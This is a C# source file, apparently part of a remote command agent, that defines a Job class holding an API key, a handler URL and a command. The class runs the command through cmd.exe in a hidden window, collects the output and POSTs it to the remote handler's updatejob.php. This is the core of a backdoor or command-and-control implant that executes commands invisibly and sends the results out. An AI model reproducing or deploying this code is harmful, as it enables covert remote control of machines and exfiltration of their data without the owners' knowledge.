using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;

class Job
{
    public string api_key { get; set; }
    public string handler_url { get; set; }
    public string id { get; set; }
    public string agent_id { get; set; }
    public string command { get; set; }
    public string command_response { get; set; }
    public string complete { get; set; }
    public string created_at { get; set; }
    public string updated_at { get; set; }

    public void RunCmd()
    {
        Debug.WriteLine("Running Command: " + this.command);
        System.Diagnostics.Process process = new System.Diagnostics.Process();
        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
        startInfo.FileName = "cmd.exe";
        startInfo.Arguments = "/C" + this.command;
        startInfo.RedirectStandardOutput = true;
        startInfo.UseShellExecute = false;
        process.StartInfo = startInfo;
        process.Start();
        string line = "";
        while (!process.StandardOutput.EndOfStream)
        {
            line = line + System.Environment.NewLine + process.StandardOutput.ReadLine();
        }
        this.command_response = line;
        
    }

    public void Start()
    {
        try
        {
            RunCmd();
            CompleteJob();
        }
        catch (System.Exception)
        {
            throw;
        }
    }

    private void CompleteJob()
    {
        Debug.WriteLine("Completing job and updating database");
        string remote_function = "updatejob.php";
        string post_string = "api_key=" + this.api_key + "&job_id=" + this.id + "&command_response=" + this.command_response;

        string response_json = HttpPost(post_string, remote_function);
    }

    private string HttpPost(string post_string, string remote_function)
    {
        string post_data = post_string;

        string uri = this.handler_url + remote_function;

        HttpWebRequest request = (HttpWebRequest)
        WebRequest.Create(uri); request.KeepAlive = false;
        request.ProtocolVersion = HttpVersion.Version10;
        request.Method = "POST";

        byte[] postBytes = Encoding.ASCII.GetBytes(post_data);

        request.ContentType = "application/x-www-form-urlencoded";
        request.ContentLength = postBytes.Length;
        Stream requestStream = request.GetRequestStream();

        requestStream.Write(postBytes, 0, postBytes.Length);
        requestStream.Close();

        HttpWebResponse response = (HttpWebResponse)request.GetResponse();

        StreamReader sr = new StreamReader(response.GetResponseStream());
        string postresp = sr.ReadToEnd();

        return postresp;
    }


}